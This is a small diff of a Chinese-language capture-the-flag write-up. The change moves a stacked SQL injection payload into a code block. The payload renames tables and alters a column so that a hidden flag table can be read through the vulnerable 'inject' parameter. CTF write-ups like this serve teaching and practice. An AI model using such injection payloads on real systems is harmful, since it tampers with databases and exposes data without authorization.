@@ -88,7 +88,9 @@ array(6) {
 
 又是一次绝望, 看了 write up 后, 原来还有这样一种思路: 因为当开始我门读取 `inject=1`, `inject=2` 只读到两个 `inject` 的值, 所以页面显示我们可以读取的数据属于 `words`, 但 `flag` 又在 `1919810931114514` 里. 那么, 可以把这两个 `table` 的内容相换!!!
 
-`?inject=-1'%3bRENAME+TABLE+`words`+TO+`words1`%3bRENAME+TABLE+`1919810931114514`+TO+`words`%3bALTER+TABLE+`words`+CHANGE+`flag`+`id`+VARCHAR(100)+CHARACTER+SET+utf8+COLLATE+utf8_general_ci+NOT+NULL%3b--+-`
+```
+?inject=-1'%3bRENAME+TABLE+`words`+TO+`words1`%3bRENAME+TABLE+`1919810931114514`+TO+`words`%3bALTER+TABLE+`words`+CHANGE+`flag`+`id`+VARCHAR(100)+CHARACTER+SET+utf8+COLLATE+utf8_general_ci+NOT+NULL%3b--+-
+```
 
 现在我们已经可以读取 `words` 的内容和那到 `flag`:
 
